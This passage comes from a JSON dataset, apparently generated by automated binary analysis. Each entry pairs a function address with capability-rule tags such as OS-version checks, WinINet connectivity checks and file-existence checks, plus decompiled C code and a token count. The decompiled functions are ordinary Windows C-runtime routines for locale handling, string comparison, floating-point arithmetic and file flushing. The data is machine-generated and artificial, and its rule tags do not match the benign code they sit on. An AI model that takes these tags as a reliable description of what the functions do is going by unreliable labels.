            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042094f(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint in_stack_0000004c;\n    uint in_stack_00000050;\n    \n    iVar1 = fcn.00414501();\n    iVar1 = *(iVar1 + 0x60);\n    if (iVar1 != *0x46870c) {\n        iVar1 = fcn.00412c04();\n    }\n    if (arg_10h == 0) {\n        return 0;\n    }\n    iVar1 = fcn.0042112d(*(iVar1 + 0xc), 1, arg_8h, arg_10h, arg_ch, arg_10h, *(iVar1 + 4), unaff_EBP, unaff_retaddr, \n                         arg_8h, arg_ch, arg_10h, in_stack_00000010, in_stack_00000014, in_stack_00000018, \n                         in_stack_0000001c, in_stack_00000020, in_stack_00000024, in_stack_00000028, in_stack_0000002c, \n                         in_stack_00000030, in_stack_00000034, in_stack_00000038, in_stack_0000003c, in_stack_00000040, \n                         in_stack_00000044, in_stack_00000048, in_stack_0000004c, in_stack_00000050);\n    if (iVar1 == 0) {\n        return 0x7fffffff;\n    }\n    return iVar1 + -2;\n}\n",
        "token_count": 512
    },
    "00420a2d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00420a2d(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    int32_t *piVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    uint16_t uVar6;\n    uint32_t uVar7;\n    uint16_t uVar8;\n    int32_t var_28h;\n    uint16_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar3 = arg_ch;\n    var_4h = *0x4640c8;\n    var_1ch = 0;\n    var_10h._0_1_ = 0;\n    var_10h._1_1_ = 0;\n    var_10h._2_2_ = 0;\n    var_ch._0_2_ = 0;\n    var_ch._2_2_ = 0;\n    var_8h._0_2_ = 0;\n    var_8h._2_1_ = 0;\n    var_8h._3_1_ = 0;\n    uVar6 = *(arg_ch + 10) & 0x7fff;\n    uVar4 = *(arg_8h + 10) & 0x7fff;\n    uVar8 = (*(arg_ch + 10) ^ *(arg_8h + 10)) & 0x8000;\n    uVar2 = uVar6 + uVar4;\n    if (((uVar4 < 0x7fff) && (uVar6 < 0x7fff)) && (uVar2 < 0xbffe)) {\n        if (uVar2 < 0x3fc0) {\ncode_r0x00420ada:\n            arg_8h[2] = 0;\n            arg_8h[1] = 0;\n            *arg_8h = 0;\n            goto code_r0x00420c52;\n        }\n        if (uVar4 == 0) {\n            uVar2 = uVar2 + 1;\n            arg_8h._0_2_ = 0;\n            if ((((arg_8h[2] & 0x7fffffffU) != 0) || (arg_8h[1] != 0)) || (*arg_8h != 0)) goto code_r0x00420ac4;\n        }\n        else {\ncode_r0x00420ac4:\n            if (((uVar6 == 0) && (uVar2 = uVar2 + 1,  (arg_ch[2] & 0x7fffffffU) == 0)) &&\n               ((arg_ch[1] == 0 && (*arg_ch == 0)))) goto code_r0x00420ada;\n            var_18h = 0;\n            var_14h = &var_ch;\n            arg_ch = 0x5;\n            do {\n                if (0 < arg_ch) {\n                    var_24h = var_18h * 2 + arg_8h;\n                    var_20h = piVar3 + 2;\n                    var_28h = arg_ch;\n                    do {\n                        iVar5 = fcn.0041f13e(var_14h[-1], *var_20h * *var_24h, var_14h + -1);\n                        if (iVar5 != 0) {\n                            *var_14h = *var_14h + 1;\n                        }\n                        var_24h = var_24h + 1;\n                        var_20h = var_20h + -2;\n                        var_28h = var_28h + -1;\n                    } while (var_28h != 0);\n                }\n                var_14h = var_14h + 2;\n                var_18h = var_18h + 1;\n                arg_ch = arg_ch + -1;\n            } while (0 < arg_ch);\n            arg_8h._0_2_ = uVar2 + 0xc002;\n            if (arg_8h < 1) {\ncode_r0x00420b8e:\n                arg_8h._0_2_ = arg_8h - 1;\n                if (arg_8h < 0) {\n                    uVar7 = -arg_8h;\n                    arg_8h._0_2_ = 0;\n                    do {\n                        if ((var_10h & 1) != 0) {\n                            var_1ch = var_1ch + 1;\n                        }\n                        fcn.0041f1eb(&var_10h);\n                        uVar7 = uVar7 - 1;\n                    } while (uVar7 != 0);\n                    if (var_1ch != 0) {\n                        var_10h._0_1_ = var_10h | 1;\n                    }\n                }\n            }\n            else {\n                do {\n                    if ((var_8h._3_1_ & 0x80) != 0) break;\n                    fcn.0041f1bd(&var_10h);\n                    arg_8h._0_2_ = arg_8h - 1;\n                } while (0 < arg_8h);\n                if (arg_8h < 1) goto code_r0x00420b8e;\n            }\n            if ((0x8000 < CONCAT11(var_10h._1_1_, var_10h)) ||\n               ((CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) & 0x1ffff) == 0x18000)) {\n                if (CONCAT22(var_ch, var_10h._2_2_) == -1) {\n                    var_10h._2_2_ = 0;\n                    var_ch._0_2_ = 0;\n                    if (CONCAT22(var_8h, var_ch._2_2_) == -1) {\n                        var_ch._2_2_ = 0;\n                        var_8h._0_2_ = 0;\n                        if (CONCAT11(var_8h._3_1_, var_8h._2_1_) == -1) {\n                            arg_8h._0_2_ = arg_8h + 1;\n                            var_8h._2_1_ = 0;\n                            var_8h._3_1_ = 0x80;\n                        }\n                        else {\n                            iVar1 = CONCAT11(var_8h._3_1_, var_8h._2_1_) + 1;\n                            var_8h._2_1_ = iVar1;\n                            var_8h._3_1_ = iVar1 >> 8;\n                        }\n                    }\n                    else {\n                        iVar5 = CONCAT22(var_8h, var_ch._2_2_) + 1;\n                        var_ch._2_2_ = iVar5;\n                        var_8h._0_2_ = iVar5 >> 0x10;\n                    }\n                }\n                else {\n                    iVar5 = CONCAT22(var_ch, var_10h._2_2_) + 1;\n                    var_10h._2_2_ = iVar5;\n                    var_ch._0_2_ = iVar5 >> 0x10;\n                }\n            }\n            if (0x7ffe < arg_8h) goto code_r0x00420c37;\n            *arg_8h = var_10h._2_2_;\n            *(arg_8h + 2) = CONCAT22(var_ch._2_2_, var_ch);\n            *(arg_8h + 6) = CONCAT13(var_8h._3_1_, CONCAT12(var_8h._2_1_, var_8h));\n            arg_8h._0_2_ = arg_8h | uVar8;\n        }\n        *(arg_8h + 10) = arg_8h;\n    }\n    else {\ncode_r0x00420c37:\n        arg_8h[1] = 0;\n        *arg_8h = 0;\n        arg_8h[2] = (-(uVar8 != 0) & 0x80000000) + 0x7fff8000;\n    }\ncode_r0x00420c52:\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 1916
    },
    "00420d82": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00420d82(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00412580(0x457ee8, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x4685cc) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x4685e0;\n        iVar4 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n            fcn.0041fdc6(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\ncode_r0x00420e02:\n                puVar3 = fcn.004131f5();\n                *puVar3 = 9;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.0041fd85(arg_8h_00);\n                iVar4 = (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(uVar2);\n                if (iVar4 == 0) {\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    *(unaff_EBP + -0x1c) = uVar2;\n                }\n                else {\n                    *(unaff_EBP + -0x1c) = 0;\n                }\n                if (*(unaff_EBP + -0x1c) != 0) {\n                    puVar3 = fcn.004131fe();\n                    *puVar3 = *(unaff_EBP + -0x1c);\n                    goto code_r0x00420e02;\n                }\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00420e22();\n            goto code_r0x00420e38;\n        }\n    }\n    puVar3 = fcn.004131f5();\n    *puVar3 = 9;\ncode_r0x00420e38:\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 586
    },
    "00420e3e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_24h_2\n// WARNING: Variable defined which should be unmapped: var_20h_2\n// WARNING: Variable defined which should be unmapped: var_1ch_2\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid __cdecl\nfcn.00420e3e(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint CodePage, uint noname_5, uint arg_8h, \n            uint arg_ch, uint noname_8, uint noname_9, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uchar *arg_8h_00;\n    int32_t unaff_EBP;\n    uint Locale;\n    uint LCType;\n    uint lpLCData;\n    uint cchData;\n    uint var_34h;\n    uint uVar2;\n    uint var_28h;\n    uint var_24h_2;\n    uint var_20h_2;\n    uint var_1ch_2;\n    uint uStack24;\n    uint uStack20;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    \n    var_18h = 0x18;\n    var_1ch = 0x457ef8;\n    var_20h = 0x420e4a;\n    fcn.00412580();\n    if (*0x46753c == 0) {\n        var_20h = 0;\n        var_24h = 0;\n        uStack20 = 1;\n        uStack24 = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)();\n        if (iVar1 == 0) {\n            var_20h = 0x420e73;\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x78) {\n                *0x46753c = 2;\n            }\n        }\n        else {\n            *0x46753c = 1;\n        }\n    }\n    if (*0x46753c == 1) {\n        var_20h = *(unaff_EBP + 0x14);\n        var_24h = *(unaff_EBP + 0x10);\n        uStack20 = *(unaff_EBP + 0xc);\n        uStack24 = *(unaff_EBP + 8);\n        (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)();\n    }\n    else if ((*0x46753c == 2) || (*0x46753c == 0)) {\n        *(unaff_EBP + -0x1c) = 0;\n        *(unaff_EBP + -0x24) = 0;\n        if (*(unaff_EBP + 0x18) == 0) {\n            *(unaff_EBP + 0x18) = *0x4673c0;\n        }\n        var_20h = 0;\n        var_24h = 0;\n        uStack20 = *(unaff_EBP + 0xc);\n        uStack24 = *(unaff_EBP + 8);\n        arg_8h_00 = &stack0xffffffe8;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)();\n        *(unaff_EBP + -0x20) = iVar1;\n        if (iVar1 != 0) {\n            *(unaff_EBP + -4) = 0;\n            fcn.004112a0();\n            *(unaff_EBP + -0x18) = &stack0xffffffe8;\n            *(unaff_EBP + -0x28) = &stack0xffffffe8;\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x18) {\n                arg_8h_00 = fcn.0041101f(*(unaff_EBP + -0x20));\n                if (arg_8h_00 == NULL) goto code_r0x00420f65;\n                *(unaff_EBP + -0x24) = 1;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)\n                              (*(unaff_EBP + 8), *(unaff_EBP + 0xc), arg_8h_00, *(unaff_EBP + -0x20));\n            if (iVar1 != 0) {\n                if (*(unaff_EBP + 0x14) == 0) {\n                    var_28h = 0;\n                    uVar2 = 0;\n                }\n                else {\n                    var_28h = *(unaff_EBP + 0x14);\n                    uVar2 = *(unaff_EBP + 0x10);\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                  (*(unaff_EBP + 0x18), 1, arg_8h_00, 0xffffffff, uVar2, var_28h);\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            if (*(unaff_EBP + -0x24) != 0) {\n                fcn.00411031(arg_8h_00);\n            }\n        }\n    }\ncode_r0x00420f65:\n    *(unaff_EBP + -0x38) = 0x420f6d;\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 1251
    },
    "00420f6e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_24h_2\n// WARNING: Variable defined which should be unmapped: var_20h_2\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid __cdecl\nfcn.00420f6e(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint CodePage, uint noname_5, uint Locale, \n            uint LCType, uint lpLCData, uint cchData, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uchar *arg_8h;\n    int32_t unaff_EBP;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h;\n    uint var_4h;\n    uint uVar2;\n    uint uVar3;\n    uint var_28h;\n    uint var_24h_2;\n    uint var_20h_2;\n    uint var_34h;\n    uint uStack24;\n    uint uStack20;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    \n    var_18h = 0x18;\n    var_1ch = 0x457f08;\n    var_20h = 0x420f7a;\n    fcn.00412580();\n    if (*0x467540 == 0) {\n        var_20h = 0;\n        var_24h = 0;\n        uStack20 = 1;\n        uStack24 = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)();\n        if (iVar1 == 0) {\n            var_20h = 0x420fa3;\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x78) {\n                *0x467540 = 2;\n            }\n        }\n        else {\n            *0x467540 = 1;\n        }\n    }\n    if ((*0x467540 == 2) || (*0x467540 == 0)) {\n        var_20h = *(unaff_EBP + 0x14);\n        var_24h = *(unaff_EBP + 0x10);\n        uStack20 = *(unaff_EBP + 0xc);\n        uStack24 = *(unaff_EBP + 8);\n        (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)();\n    }\n    else if (*0x467540 == 1) {\n        *(unaff_EBP + -0x1c) = 0;\n        *(unaff_EBP + -0x20) = 0;\n        if (*(unaff_EBP + 0x18) == 0) {\n            *(unaff_EBP + 0x18) = *0x4673c0;\n        }\n        var_20h = 0;\n        var_24h = 0;\n        uStack20 = *(unaff_EBP + 0xc);\n        uStack24 = *(unaff_EBP + 8);\n        arg_8h = &stack0xffffffe8;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)();\n        *(unaff_EBP + -0x24) = iVar1;\n        if (iVar1 != 0) {\n            *(unaff_EBP + -4) = 0;\n            fcn.004112a0();\n            *(unaff_EBP + -0x18) = &stack0xffffffe8;\n            *(unaff_EBP + -0x28) = &stack0xffffffe8;\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x18) {\n                arg_8h = fcn.0041101f(iVar1 * 2);\n                if (arg_8h == NULL) goto code_r0x004210a5;\n                *(unaff_EBP + -0x20) = 1;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)(*(unaff_EBP + 8), *(unaff_EBP + 0xc), arg_8h, iVar1);\n            if (iVar1 != 0) {\n                if (*(unaff_EBP + 0x14) == 0) {\n                    uVar3 = 0;\n                    uVar2 = 0;\n                }\n                else {\n                    uVar3 = *(unaff_EBP + 0x14);\n                    uVar2 = *(unaff_EBP + 0x10);\n                }\n                uVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                  (*(unaff_EBP + 0x18), 0, arg_8h, 0xffffffff, uVar2, uVar3, 0, 0);\n                *(unaff_EBP + -0x1c) = uVar3;\n            }\n            if (*(unaff_EBP + -0x20) != 0) {\n                fcn.00411031(arg_8h);\n            }\n        }\n    }\ncode_r0x004210a5:\n    *(unaff_EBP + -0x38) = 0x4210ad;\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 1199
    },
    "00421111": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.00421111(int32_t param_1)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = param_1;\n    if (param_1 != 0) {\n        do {\n            iVar1 = iVar1 + -1;\n            if (*in_EAX == '\\0') goto code_r0x00421125;\n            in_EAX = in_EAX + 1;\n        } while (iVar1 != 0);\n    }\n    iVar1 = iVar1 + -1;\ncode_r0x00421125:\n    return (param_1 - iVar1) + -1;\n}\n",
        "token_count": 141
    },
    "0042112d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_44h_2\n// WARNING: Variable defined which should be unmapped: var_40h_3\n// WARNING: Variable defined which should be unmapped: var_3ch_3\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_40h_2\n// WARNING: Variable defined which should be unmapped: var_3ch_2\n// WARNING: Variable defined which should be unmapped: var_5ch\n\nvoid __cdecl\nfcn.0042112d(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint arg_8h, uint arg_ch, uint lpMultiByteStr, uint cbMultiByte, \n            uint lpString2, uint cchCount2, uint CodePage)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint8_t *puVar4;\n    uint *arg_8h_00;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    int32_t iVar6;\n    uint Locale;\n    uint dwCmpFlags;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint lpCPInfo;\n    uint var_4h_2;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_18h_2;\n    uint var_1ch_2;\n    uint var_20h;\n    uint var_4h;\n    uint var_50h;\n    uint var_44h_2;\n    uint var_40h_3;\n    uint var_3ch_3;\n    uint lpString1;\n    uint var_30h_2;\n    uchar auStack48 [2];\n    uint var_2ah;\n    int32_t var_4ch;\n    uint var_40h_2;\n    uint var_3ch_2;\n    uint var_5ch;\n    uint uVar7;\n    \n    uVar7 = 0x40;\n    fcn.00412580();\n    *(unaff_EBP + -0x1c) = *0x4640c8;\n    iVar6 = 0;\n    if (*0x467544 == 0) {\n        var_4ch = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_CompareStringW)();\n        if (iVar2 == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar2 == 0x78) {\n                *0x467544 = 2;\n            }\n        }\n        else {\n            *0x467544 = 1;\n        }\n    }\n    if (0 < *(unaff_EBP + 0x14)) {\n        uVar3 = fcn.00421111();\n        *(unaff_EBP + 0x14) = uVar3;\n    }\n    iVar2 = *(unaff_EBP + 0x1c);\n    if (0 < iVar2) {\n        iVar2 = fcn.00421111();\n        *(unaff_EBP + 0x1c) = iVar2;\n    }\n    if ((*0x467544 == 2) || (*0x467544 == 0)) {\n        *(unaff_EBP + -0x38) = 0;\n        if (*(unaff_EBP + 8) == 0) {\n            *(unaff_EBP + 8) = *0x4673b0;\n        }\n        iVar2 = *(unaff_EBP + 0x20);\n        if (*(unaff_EBP + 0x20) == 0) {\n            iVar2 = *0x4673c0;\n        }\n        iVar5 = fcn.0041ea89(*(unaff_EBP + 8));\n        if (iVar5 == -1) goto code_r0x004214a0;\n        if (iVar5 != iVar2) {\n            var_4ch = iVar2;\n            iVar6 = fcn.0041eacc(iVar2, iVar5, *(unaff_EBP + 0x10), unaff_EBP + 0x14, 0, 0, 0x457f18, uVar7);\n            if (iVar6 == 0) goto code_r0x004214a0;\n            var_4ch = iVar2;\n            iVar2 = fcn.0041eacc(iVar2, iVar5, *(unaff_EBP + 0x18), unaff_EBP + 0x1c, 0, 0, 0x457f18, uVar7);\n            *(unaff_EBP + -0x38) = iVar2;\n            if (iVar2 == 0) {\n                fcn.00411031(iVar6);\n                goto code_r0x004214a0;\n            }\n            *(unaff_EBP + 0x10) = iVar6;\n            *(unaff_EBP + 0x18) = *(unaff_EBP + -0x38);\n        }\n        var_4ch = *(unaff_EBP + 8);\n        (*_sym.imp.KERNEL32.dll_CompareStringA)();\n        if (iVar6 != 0) {\n            fcn.00411031(iVar6);\n            stack0xffffffd4 = 0x42149c;\n            fcn.00411031(*(unaff_EBP + -0x38));\n        }\n        goto code_r0x004214a0;\n    }\n    if (*0x467544 != 1) goto code_r0x004214a0;\n    *(unaff_EBP + -0x3c) = 0;\n    *(unaff_EBP + -0x44) = 0;\n    *(unaff_EBP + -0x40) = 0;\n    if (*(unaff_EBP + 0x20) == 0) {\n        *(unaff_EBP + 0x20) = *0x4673c0;\n    }\n    if ((*(unaff_EBP + 0x14) == 0) || (iVar2 == 0)) {\n        if ((*(unaff_EBP + 0x14) == iVar2) ||\n           (((1 < iVar2 || (1 < *(unaff_EBP + 0x14))) || (iVar6 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(),  iVar6 == 0))))\n        goto code_r0x004214a0;\n        if (0 < *(unaff_EBP + 0x14)) {\n            if (1 < *(unaff_EBP + -0x30)) {\n                puVar4 = unaff_EBP + -0x2a;\n                uVar1 = *(unaff_EBP + -0x2a);\n                while (((uVar1 != 0 && (puVar4[1] != 0)) &&\n                       ((**(unaff_EBP + 0x10) < *puVar4 || (puVar4[1] < **(unaff_EBP + 0x10)))))) {\n                    puVar4 = puVar4 + 2;\n                    uVar1 = *puVar4;\n                }\n            }\n            goto code_r0x004214a0;\n        }\n        if (0 < *(unaff_EBP + 0x1c)) {\n            if (1 < *(unaff_EBP + -0x30)) {\n                puVar4 = unaff_EBP + -0x2a;\n                uVar1 = *(unaff_EBP + -0x2a);\n                while (((uVar1 != 0 && (puVar4[1] != 0)) &&\n                       ((**(unaff_EBP + 0x18) < *puVar4 || (puVar4[1] < **(unaff_EBP + 0x18)))))) {\n                    puVar4 = puVar4 + 2;\n                    uVar1 = *puVar4;\n                }\n            }\n            goto code_r0x004214a0;\n        }\n    }\n    var_4ch = *(unaff_EBP + 0x20);\n    iVar6 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n    *(unaff_EBP + -0x48) = iVar6;\n    if (iVar6 == 0) goto code_r0x004214a0;\n    *(unaff_EBP + -4) = 0;\n    fcn.004112a0();\n    *(unaff_EBP + -0x18) = &fcn.0042112d::var_4ch;\n    *(unaff_EBP + -0x34) = &fcn.0042112d::var_4ch;\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + -0x34) == 0) {\n        iVar2 = fcn.0041101f();\n        *(unaff_EBP + -0x34) = iVar2;\n        if (iVar2 == 0) goto code_r0x004214a0;\n        *(unaff_EBP + -0x3c) = 1;\n    }\n    unique0x00007a00 = *(unaff_EBP + 0x14);\n    _auStack48 = *(unaff_EBP + 0x10);\n    var_30h_2 = 1;\n    lpString1 = *(unaff_EBP + 0x20);\n    iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n    if (iVar2 != 0) {\n        arg_8h_00 = &fcn.0042112d::lpString1;\n        iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                          (*(unaff_EBP + 0x20), 9, *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c), 0, 0);\n        *(unaff_EBP + -0x4c) = iVar2;\n        if (iVar2 != 0) {\n            *(unaff_EBP + -4) = 1;\n            fcn.004112a0();\n            *(unaff_EBP + -0x18) = &fcn.0042112d::lpString1;\n            *(unaff_EBP + -0x50) = &fcn.0042112d::lpString1;\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x38) {\n                arg_8h_00 = fcn.0041101f(iVar2 * 2);\n                if (arg_8h_00 == NULL) goto code_r0x004213db;\n                *(unaff_EBP + -0x44) = 1;\n            }\n            iVar5 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                              (*(unaff_EBP + 0x20), 1, *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c), arg_8h_00, iVar2);\n            if (iVar5 != 0) {\n                uVar7 = (*_sym.imp.KERNEL32.dll_CompareStringW)\n                                  (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x34), iVar6, arg_8h_00, iVar2);\n                *(unaff_EBP + -0x40) = uVar7;\n            }\n            if (*(unaff_EBP + -0x44) != 0) {\n                fcn.00411031(arg_8h_00);\n            }\n        }\n    }\ncode_r0x004213db:\n    if (*(unaff_EBP + -0x3c) != 0) {\n        fcn.00411031(*(unaff_EBP + -0x34));\n    }\ncode_r0x004214a0:\n    *(unaff_EBP + -0x60) = 0x4214ab;\n    fcn.0041176c();\n    *(unaff_EBP + -0x60) = 0x4214b0;\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 2849
    },
    "004214fe": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * fcn.004214fe(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t *unaff_EDI;\n    uint var_4h;\n    \n    iVar3 = 0;\n    if (unaff_EDI != NULL) {\n        iVar1 = *unaff_EDI;\n        piVar2 = unaff_EDI;\n        while (iVar1 != 0) {\n            piVar2 = piVar2 + 1;\n            iVar3 = iVar3 + 1;\n            iVar1 = *piVar2;\n        }\n        piVar2 = fcn.0041101f(iVar3 * 4 + 4);\n        if (piVar2 == NULL) {\n            fcn.004114c7(9);\n        }\n        iVar3 = *unaff_EDI;\n        piVar4 = piVar2;\n        while (iVar3 != 0) {\n            iVar3 = fcn.00412404(iVar3);\n            *piVar4 = iVar3;\n            piVar4 = piVar4 + 1;\n            unaff_EDI = unaff_EDI + 1;\n            iVar3 = *unaff_EDI;\n        }\n        *piVar4 = 0;\n        return piVar2;\n    }\n    return unaff_EDI;\n}\n",
        "token_count": 305
    },
    "00422642": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00422642(uint *param_1)\n\n{\n    if (*(param_1 + 1) != '\\0') {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(*param_1);\n        *(param_1 + 1) = 0;\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "00422c0d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
